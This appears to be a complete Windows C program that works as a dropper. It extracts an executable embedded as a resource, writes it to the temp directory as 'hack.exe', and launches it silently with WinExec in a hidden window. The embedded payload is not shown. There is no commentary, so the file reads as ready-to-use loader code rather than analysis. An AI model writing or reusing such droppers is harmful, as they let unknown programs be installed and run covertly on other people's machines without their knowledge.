#include <windows.h>
#include "resource.h"

int main()
{
	char path[MAX_PATH];
	GetTempPathA(MAX_PATH, path);
	strcat(path, "hack.exe");
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(IDR_ETC1), "ETC");
	HGLOBAL hMem = LoadResource(hModule, hRes);
	LPVOID lpResource = LockResource(hMem);
	DWORD size = SizeofResource(hModule, hRes);
	HANDLE hFile;
	DWORD dwWrite;

	hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, hMem, size, &dwWrite, NULL);
	CloseHandle(hFile);
	WinExec(path, 0);
	
	return 0;
}
